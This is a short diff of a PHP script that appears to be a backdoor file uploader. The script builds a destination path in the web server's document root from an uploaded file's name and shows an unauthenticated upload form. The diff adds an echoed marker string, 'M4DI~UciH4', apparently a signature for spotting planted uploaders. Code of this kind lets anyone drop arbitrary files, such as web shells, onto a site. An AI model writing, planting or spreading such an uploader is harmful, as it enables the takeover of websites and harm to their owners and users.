@@ -4,6 +4,7 @@ $root = $_SERVER['DOCUMENT_ROOT'];
 $files = $_FILES['file']['name'];
 $saw2 = $root.'/'.$files;
 $saw1 = $_FILES['file']['tmp_name'];
+echo 'M4DI~UciH4';
 echo "<form method='POST' enctype='multipart/form-data'>
 <input type='file'name='file' />
 <input type='submit' value='up' />
